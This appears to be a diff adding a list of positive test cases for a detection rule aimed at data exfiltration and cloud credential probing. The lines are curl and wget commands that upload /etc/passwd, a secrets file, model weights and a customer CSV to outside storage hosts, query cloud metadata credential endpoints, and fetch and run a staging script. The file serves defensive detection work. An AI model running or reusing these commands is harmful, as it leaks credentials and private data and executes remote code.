@@ -1,0 +1,11 @@
+# The behaviour under investigation and close variants. A useful detection must fire on
+# ALL of these. Destinations are off the sanctioned allowlist and/or metadata endpoints.
+# (Shapes drawn from the documented behaviour class; hosts are sinkhole/placeholder.)
+curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary "PROBE_PAYLOAD" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin
+curl -s http://100.100.100.200/latest/meta-data/ ; echo "exit=$?"
+curl -sSfL http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -s -o /tmp/stage.sh http://r0ck3t-upload.oss-cn-hangzhou.aliyuncs.com/anon/stage.sh; bash /tmp/stage.sh
+curl -s -X POST --data-binary @/etc/passwd http://r0bodycti01.blob.core.windows.net/coldchain/exfil.bin
+wget -q --post-file=/tmp/secrets.env http://tempfiles.example.net/u/probe
+curl -s -X PUT --upload-file /data/model.safetensors https://backups.storage.yandexcloud.net/exfil/m.bin
+curl -s --data-binary @/tmp/customers.csv https://up.cos.ap-guangzhou.myqcloud.com/drop/c.csv
